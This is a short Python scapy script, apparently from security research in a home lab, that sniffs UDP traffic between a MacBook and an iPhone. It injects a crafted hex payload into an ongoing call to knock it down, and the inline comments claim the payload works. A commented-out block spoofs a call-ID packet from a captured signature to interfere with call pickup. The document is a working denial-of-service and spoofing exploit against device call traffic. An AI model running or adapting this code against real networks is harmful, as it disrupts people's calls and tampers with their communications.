import sys
import binascii
import socket
import struct
import os
from scapy.all import *

iphone = "192.168.0.111"
macbook = "192.168.0.200"
kali = "192.168.0.105"

globalCounter = 0
previousVoicePayload = ""


def processPackage(pkt):
    # DURING CALL
    print
    "\n\n---Packet found"
    dosPayload = "20040004000000000000000000b002000000000000000000000000000000000000000000000000000000000000"
    pkt = IP(src=pkt[IP].src, dst=pkt[IP].dst) / UDP(sport=pkt.sport, dport=pkt.dport) / binascii.unhexlify(
        dosPayload)  # IT WORKS when sent during the call!!!!
    send(pkt)
    exit("During call")


# # At CALL initiation
# print "---Auth package received"
# payload = binascii.hexlify(pkt.load)	
# signature = payload[18:42]
# print "--- Signature: %s" % signature
# print payload
# print "---Send the spoofed callID packet to the iPhone"
# dosPayload = "0f000100382112a442" + signature + "00250004000000010006002431314132363832412d434537302d344546462d383835352d4132463142463644383543448005000452b20000"
# pktToBeSent = IP(src=pkt[IP].src, dst=pkt[IP].dst)/UDP(sport=pkt.sport, dport=pkt.dport)/binascii.unhexlify(dosPayload) # IT WORKS!! It does not let you pickup in the machine but you can pickup in the phone
# print binascii.hexlify(pktToBeSent.load)
# send(pktToBeSent)
# exit("At call initiation")


print
"---Finding an ongoing call..."
myfilter = f"udp and src {macbook} and dst {iphone}"
sniff(iface="en0", filter=myfilter, prn=processPackage)
